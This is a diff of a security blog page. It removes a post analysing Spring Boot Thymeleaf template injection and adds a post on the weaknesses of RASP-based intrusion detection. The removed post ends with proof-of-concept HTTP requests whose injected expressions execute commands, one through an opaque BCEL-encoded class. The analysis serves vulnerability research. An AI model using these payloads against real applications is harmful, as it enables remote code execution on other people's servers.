@@ -152,76 +152,53 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-spring-boot-thymeleaf-ssti" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-RASP之困" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/10/spring-boot-thymeleaf-ssti/">spring-boot-thymeleaf-ssti</a>
+      <a class="article-title" href="/2021/12/02/RASP%E4%B9%8B%E5%9B%B0/">RASP之困</a>
     </h1>
   
 
         
-        <a href="/2021/08/10/spring-boot-thymeleaf-ssti/" class="archive-article-date">
-  	<time datetime="2021-08-11T05:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-10</time>
+        <a href="/2021/12/02/RASP%E4%B9%8B%E5%9B%B0/" class="archive-article-date">
+  	<time datetime="2021-12-03T04:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-02</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="spring-boot-thymeleaf-ssti"><a href="#spring-boot-thymeleaf-ssti" class="headerlink" title="spring-boot-thymeleaf-ssti"></a>spring-boot-thymeleaf-ssti</h1><p>spring-boot下的thymeleaf模板注入挺有趣的，本文尝试对该漏洞一探究竟。</p>
-<p><code>https://github.com/veracode-research/spring-view-manipulation</code></p>
-<p>本文使用该项目给出的demo进行调试分析，其中，<code>spring-boot</code>版本为<code>2.2.0.RELEASE</code>，</p>
-<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><h3 id="自动装配"><a href="#自动装配" class="headerlink" title="自动装配"></a>自动装配</h3><p>首先，我们知道，在配置好spring-boot情况下，加入如下thymeleaf的mvn依赖，就可以实现thymeleaf的自动配置。</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><code>thtmyleaf</code>的自动配置类为<code>org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration</code></p>
-<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/ThymeleafAutoConfiguration.png" alt="ThymeleafAutoConfiguration"></p>
-<h3 id="排序viewResolvers"><a href="#排序viewResolvers" class="headerlink" title="排序viewResolvers"></a>排序viewResolvers</h3><p>我们可以看到，在<code>o.s.w.s.v.ContentNegotiatingViewResolver#initServletContext</code>方法中，对<code>viewResolvers</code>进行初始化，初始化后包含了多个视图解析器（模板引擎），包括 <code>BeanNameViewResolver</code>、<code>ViewResolverComposite</code>、<code>InternalResourceViewResolver</code>、<code>ThymeleafViewResolver</code>。</p>
-<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/ContentNegotiatingViewResolver_initServletContext.png" alt></p>
-<p>查看<code>ThymeleafViewResolver</code>源码，发现其<code>order</code>值为<code>Integer.MAX_VALUE</code>，通过<code>sort</code>方法排序过后的结果如下图所示（<code>BeanNameViewResolver</code>也是Integer.MAX_VALUE）：</p>
-<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/viewResolvers_sorted.png" alt></p>
-<p>具体代码流可以参考这里的堆栈信息：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getOrder:282, ThymeleafViewResolver (org.thymeleaf.spring5.view)</span><br><span class="line">...</span><br><span class="line">initServletContext:206, ContentNegotiatingViewResolver (org.springframework.web.servlet.view)</span><br><span class="line">...</span><br><span class="line">refresh:550, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">...</span><br><span class="line">refreshContext:397, SpringApplication (org.springframework.boot)</span><br><span class="line">run:315, SpringApplication (org.springframework.boot)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<h2 id="视图解析"><a href="#视图解析" class="headerlink" title="视图解析"></a>视图解析</h2><h3 id="获得视图解析器"><a href="#获得视图解析器" class="headerlink" title="获得视图解析器"></a>获得视图解析器</h3><p><code>org.springframework.web.servlet.DispatcherServlet#render</code>：用户发起的请求触发的代码会走到这里获取视图解析器，随后从<code>resolveViewName</code>获得最匹配的视图解析器。</p>
-<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/DispatcherServlet_render.png" alt></p>
-<p><code>org.springframework.web.servlet.view.ContentNegotiatingViewResolver#resolveViewName</code>：在该方法中，先是通过<code>getCandidateViews</code>筛选出<code>resolveViewName</code>方法返回值不为null（即有效的）的视图解析器；之后通过<code>getBestView</code>方法选取“最优”的解，<code>getBestView</code>中的逻辑简而概之，优先返回重定向的视图动作，然后就是根据用户HTTP请求的<code>Accept:</code>头部字段与<code>candidateViews</code>数组中视图解析器的排序获得最优解的视图解析器，而前面所讲到的<code>viewResolvers</code>的排序正是参与决定了这一排序决策。</p>
-<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/ContentNegotiatingViewResolver_resolveViewName.png" alt></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">resolveViewName:227, ContentNegotiatingViewResolver (org.springframework.web.servlet.view)</span><br><span class="line">resolveViewName:1414, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">render:1350, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processDispatchResult:1118, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doDispatch:1057, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">...</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<h3 id="获得视图解析器名称"><a href="#获得视图解析器名称" class="headerlink" title="获得视图解析器名称"></a>获得视图解析器名称</h3><p><code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#invokeHandlerMethod</code>：该方法为获取视图名称的关键点，其中首先会调用<code>invokeAndHandle</code>（下面会讲该方法内的逻辑），之后返回<code>getModelAnView</code>方法执行结果的返回值。</p>
-<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/RequestMappingHandlerAdapter_invokeHandlerMethod.png" alt></p>
-<p><code>o.s.w.s.m.m.a.ServletInvocableHandlerMethod#invokeAndHandle</code>:在该方法中，会尝试获取前端控制器的return返回值，也就是说，如果前端Controller返回值中直接拼接了用户的输入，相当于控制了该视图名称；另外，当用户自定义的Controller方法的入参中添加了<code>ServletResponse</code>，这里的<code>invokeForRequest</code>中会触发<code>ServletResponseMethodArgumentResolver#resolveArgument</code>将<code>mavContainer</code>的<code>requestHandled</code>设置为<code>true</code>，而<code>mavContainer.isRequestHandled()</code>为<code>true</code>导致了<code>getModelAndview（...）</code>返回值为null，也就不会有后面的漏洞触发流程。</p>
-<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/ServletInvocableHandlerMethod_invokeAndHandle.png" alt></p>
-<p><code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#getModelAndView</code>：如果<code>mavContainer.isRequestHandled()</code>为<code>true</code>，直接返回null。</p>
-<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/RequestMappingHandlerAdapter_getModelAndView.png" alt></p>
-<p><code>org.springframework.web.servlet.DispatcherServlet#applyDefaultViewName</code>：另外，如果前端Controller的方法返回值为null，即void方法类型，前面的流程无法拿到视图名称，后面会调用<code>applyDefaultViewName</code>方法将URI路径作为视图名称。</p>
-<p><code>org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator#transformPath</code>：在将URI设置为视图名称的代码流程中，调用了该方法对URI进行格式调整，其中包括去除URI扩展名称。</p>
-<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/DefaultRequestToViewNameTranslator_transformPath.png" alt></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">getViewName:172, DefaultRequestToViewNameTranslator (org.springframework.web.servlet.view)</span><br><span class="line">getDefaultViewName:1391, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">applyDefaultViewName:1087, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doDispatch:1046, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">。。。</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="使用视图解析器"><a href="#使用视图解析器" class="headerlink" title="使用视图解析器"></a>使用视图解析器</h3><p><code>org.thymeleaf.spring5.view.ThymeleafView#renderFragment</code>：这里是漏洞触发的关键逻辑点之一，如果用户的输入拼接到了视图名称中，即控制了<code>viewTemplateName</code>变量。通过浏览代码，我们可以了解到，首先视图模板名称中需要包含<code>::</code>字符串，否则不会走入表达式执行代码中。</p>
-<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/ThymeleafView_renderFragment.png" alt></p>
-<p>上图的<code>o.t.s.e.StandardExpressionParser#parseExpression</code>不重要，我们这里略过，其随后会走到<code>org.thymeleaf.standard.expression.StandardExpressionPreprocessor#preprocess</code>方法：这里的<code>input</code>变量就是上面<code>viewTemplateName</code>前后分别拼接了<code>~{</code>、<code>}</code>后的字符串，随后这里使用<code>PREPROCESS_EVAL_PATTERN</code>正则对<code>input</code>进行匹配，正则内容为<code>\_\_(.*?)\_\_</code> ，随后获取正则命中后的元组内容，即非贪婪匹配的<code>.*?</code>，随后讲该元组内容传入<code>parseExpression</code>方法并在这里触发了EL表达式代码执行。</p>
-<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/StandardExpressionPreprocessor_preprocess.png" alt></p>
-<h2 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h2><p>由触发的代码流程梳理可以得出触发表达式的条件：</p>
-<p>①用户传入的字符串拼接到了Controller方法的返回值中且返回的视图非重定向（前面流程可用知晓，重定向优先级最高），或URI路径拼接了用户的输入且Controller方法参数中不带有<code>ServletResponse</code>类型的参数；</p>
-<p>②视图引擎名称中需要包含<code>::</code>字符串；</p>
-<p>③被执行表达式字符串前后需要带有两个下划线，即<code>__${EL}__</code>；</p>
-<p>④如果POC在URI中，由于URI格式化的原因且我们的POC中带有<code>.</code>符号，所以需要在URI末尾添加<code>.</code>。</p>
-<p>于是，我们可以构造出与作者有所差异的POC</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;path HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 120</span><br><span class="line"></span><br><span class="line">lang&#x3D;::__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()&#125;_______________</span><br></pre></td></tr></table></figure>
-
-<p>如果我们要利用该漏洞干点啥，建议还是结合BCEL一类的方式来利用更加方便（不过JDK251后BCEL使用不了），win弹计算器：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;path HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 1010</span><br><span class="line"></span><br><span class="line">lang&#x3D;::__$&#123;&quot;&quot;.getClass().forName(&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AePMO$c2$40$U$9c$85B$a1$W$84$e2$f7$b7$t$c1$83$3dx$c4x1z$b1$w$R$83$e7$ed$b2$c1$c5$d2$92R$8c$fe$o$cf$5e$d4x$f0$H$f8$a3$8c$af$x$R$a3$7bx$_o$e6$cdL$de$7e$7c$be$bd$D$d8$c7$b6$F$Ts$W$e6$b1P$c0b$da$97L$y$9bX1$b1$ca$90$3fP$a1J$O$Z$b2$f5F$87$c18$8a$ba$92a$d6S$a1$3c$l$P$7c$Z_q$3f$m$c4$f1$o$c1$83$O$8fU$3aO$40$p$b9Q$a3$94$T$d1$c0$f5$a5$I$dc$W$7f$I$o$dem2$U$OD0$b1$$$b5$T$$n$cf$f8P$cb$u$9c$c1jG$e3X$c8$T$95$da$d8$T$d5$5e$9f$dfq$h$F$UM$ac$d9X$c7$GEP$aa$b0$b1$89$z$86Z$ca$bb$B$P$7b$ee$f1$bd$90$c3DE$nC$e5o8A$d3$c5$L$bf$_E$c2P$9dB$97$e30Q$D$ca$b5z2$f9$Z$e6$eb$N$ef$df$O$dda$c8$7b$v$Yv$ea$bf$d8v$S$ab$b0$d7$fc$zh$c5$91$90$a3Q$T$db$c8$d3$7f$a7$_$D$96$deB$d5$a2$c9$a5$ce$a8$e7v_$c0$9e4$3dC5$af$c1$Ml$aa$f6$f7$CJ$uS$_$60$f6G$7c$a1$cd$80$f2$x2N$f6$Z$c6$f5$p$8c$d3$t$8d$VI$97CV$bb90$a8$9a$84YH$3f$b2D$a8$ad$fd$81$8af2$9e$89$wH$e8h$b8$f6$Fz7$85$d0$t$C$A$A&quot;, true, &quot;&quot;.getClass().forName(&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;).newInstance())&#125;_______________</span><br></pre></td></tr></table></figure>
-
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>spring-boot的自动化配置为开发部署带来了极大的便捷，但这也对我们深入底层问题提搞了学习成本。而该模板注入问题十分巧妙，令人深思，另外笔者也为自研的AST代码扫描器无法扫描该种漏洞感到蛋疼。</p>
+        <h1 id="RASP之困"><a href="#RASP之困" class="headerlink" title="RASP之困"></a>RASP之困</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>身为一名小小的安全研究员，在体验过公司部署的安全产品后，深感这些产品在漏洞利用检测、入侵检测方面做的还不够完美，这段时间恰逢年终，笔者也在思考其中之道，所以抛出一些想法，主要针对JAVA应用。</p>
+<h2 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h2><h3 id="OpenRASP"><a href="#OpenRASP" class="headerlink" title="OpenRASP"></a>OpenRASP</h3><p>起初定位上应该是一款”降维“的WAF，通过hook相关类方法进行漏洞检测，检测逻辑串行于业务，且检测逻辑可在JAVA代码中或JS插件中进行修改，拥有灵活的拦截开关。</p>
+<h3 id="Elkeid"><a href="#Elkeid" class="headerlink" title="Elkeid"></a>Elkeid</h3><p>定位上是一款linux下的HIDS，终端agent拥有驱动、内核、ssh日志、系统进程、敏感目录的检测能力，我们还可以注意到，其实它还配备了JVM等语言的RASP”探针“。其JVMProbe做的事情相对OpenRASP就很简单，hook点只有文件操作、命令执行、类加载、网络连接，并将hook点的线程堆栈信息及入参数据传给agent（异步），由agent传给center，且center可以下发拦截规则，规则为字符串正则，指定hook点的参数匹配拦截。另外，rasp与agent之间的数据通路还没打通，或是说还没有开源，center对agent上传的日志分析检测能力也需要我们自己建设。</p>
+<h3 id="鱼与熊掌"><a href="#鱼与熊掌" class="headerlink" title="鱼与熊掌"></a>鱼与熊掌</h3><p>OpenRASP拥有丰富的漏洞检测能力，但受限于单机，无法拥有更强的检测能力：</p>
+<p>​    1、检测逻辑是串行于业务的，需要做性能考虑；</p>
+<p>​    2、很多情况下还是“黑名单”检测（如反序列化），检测能力不足；</p>
+<p>​    3、无法对灰色行为监控判断，如命令执行；</p>
+<p>​    4、毕竟与业务耦合，java代码基本无法更新吧？另外我看js插件也没人更新（我们公司）。</p>
+<p>定位是入侵检测的Elkedi，其JVMProbe已经把JAVA应用的主干道占住了（不过笔者测试的还是有bypass问题，二开时要注意），单单从理论上来说，攻击者若从应用入侵，后续想要有其他行为，都会触发这些hook点：</p>
+<p>​    1、可对灰色行为进行监控判断：得益于center，我们可以分析这些行为</p>
+<p>​    2、由于其定位问题，所以没有什么漏洞检测能力</p>
+<p>起初是想着能不能通过center做到如下几点：</p>
+<p>​    1、更强的检测能力：对高危漏洞不再是“黑名单”式的感知告警，对灰色行为能判断，且另外拥有了历史溯源分析能力；</p>
+<p>​    2、具有生命力的RASP：与业务过于耦合的OpenRASP，在甲方似乎缺少生命力，笔者希望能在动态的攻防中，安全分析人员愿意使用它来提升应用安全。</p>
+<p>elkeid的思路下，其向center上发的数据量很小（5000进程100k/s），但大多漏洞是随着业务流量的，笔者的想法下，极有可能造成网络拥堵，这样一来，通过center加强RASP检测能力似乎不可行了。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>其实，基于HIDS角度来说，字节Elkeid的hook点基本足够了，攻击者从应用入侵的话，无论如何都无法绕过这些基本的hook点 ，防守方要做的，其实就是做好这些hook点（文件操作、类加载、命令执行）的分析即可。</p>
+<p>基于这个角度的话，做深度的漏洞检测似乎就没必要了，毕竟我只要分析好这些hook点就可以很好地发现入侵者了。但仔细想来，这样就一根筋了，毕竟如果一个产品兼具业务漏洞的检测能力与入侵检测能力不更好吗，如果我是甲方，那会十分满意的。</p>
+<p>所以，经过一番思考交流后，笔者提出了以下构思，后面也打算进行一番实践：</p>
+<p>1、大的架构上还是用Elkeid这套 JVMProbe -&gt; rasp-agent -&gt; agent -&gt; center -&gt; kafaka</p>
+<p>2、rasp-agent接收到hook点数据后，尽量先在本地做一些去重操作，然后传到center（解决前文说的灰度数据、黑名单问题），这里认为hook点数据有以下几种</p>
+<p>​    a. 较好去重的：如反序列一类的，根据线程堆栈信息去重即可</p>
+<p>​    b.不好去重的，但数据量很小：主要是命令执行类的，选择直接上传即可（HIDS思路）</p>
+<p>​     c.不好去重的，数据量大，业务类的：如SQL一类的，这个我想着后面引入OpenRASP的检测引擎来检测</p>
+<p>​    d.不需要上传的，直接在本地处理即可：xxe一类的</p>
+<p>3、JVMProbe增加动态hook功能，规则增加线程堆栈拦截维度</p>
+<p>PS：</p>
+<p>当我和同事说到字节的这个RASP HIDS 做好了（目前字节给的还是有bypass），理论上可以让应用入侵者无所遁形时，同事与我都纳闷到，如果真的这么好，为啥没火起来。当然，可能是我们没有实践应用，现在从理论上进行思考，遂得出理所当然的结论。</p>
 
       
 
@@ -234,7 +211,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/10/spring-boot-thymeleaf-ssti/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/12/02/RASP%E4%B9%8B%E5%9B%B0/">展开全文 >></a>
         </p>
       
 
@@ -266,7 +243,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/11/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><span class="space">&hellip;</span><a class="page-number" href="/page/29/">29</a><a class="extend next" rel="next" href="/page/13/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/11/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><span class="space">&hellip;</span><a class="page-number" href="/page/31/">31</a><a class="extend next" rel="next" href="/page/13/">Next &amp;raquo;</a>
     </nav>
   
 
